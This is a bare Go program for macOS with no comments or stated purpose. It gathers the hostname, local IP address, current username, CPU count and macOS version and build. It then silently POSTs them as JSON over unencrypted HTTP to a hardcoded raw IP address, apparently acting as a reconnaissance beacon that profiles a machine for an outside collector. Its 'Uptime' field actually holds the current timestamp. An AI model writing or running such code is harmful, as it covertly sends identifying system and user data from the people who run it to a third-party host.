package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

type OsInfo struct {
	Platform     string `json:"platform"`
	Hostname     string `json:"hostname"`
	LocalIP      string `json:"local_ip"`
	Uptime       uint64 `json:"uptime"`
	NumCPU       int    `json:"num_cpu"`
	GoVersion    string `json:"go_version"`
	CurrentUser  string `json:"current_user"`
	MacOSVersion string `json:"macos_version"`
	BuildVersion string `json:"build_version"`
}

func main() {
	hostname, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	addrs, err := net.InterfaceAddrs()
	if err != nil {
		panic(err)
	}
	var localIP string
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				localIP = ipnet.IP.String()
				break
			}
		}
	}

	cmd := exec.Command("sw_vers", "-productVersion")
	stdout, err := cmd.Output()
	if err != nil {
		panic(err)
	}
	macosVersion := strings.TrimSpace(string(stdout))

	cmd = exec.Command("sw_vers", "-buildVersion")
	stdout, err = cmd.Output()
	if err != nil {
		panic(err)
	}
	BuildVersion := strings.TrimSpace(string(stdout))

	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	var info OsInfo
	info.Platform = "macOS"
	info.Hostname = hostname
	info.LocalIP = localIP
	info.Uptime = uint64(time.Now().Unix())
	info.NumCPU = runtime.NumCPU()
	info.GoVersion = runtime.Version()
	info.CurrentUser = currentUser.Username
	info.MacOSVersion = macosVersion
	info.BuildVersion = BuildVersion

	jsonInfo, err := json.Marshal(info)
	if err != nil {
		panic(err)
	}

	url := "http://51.75.74.249:8000/"
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonInfo))
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	fmt.Println("Response Status:", resp.Status)
}
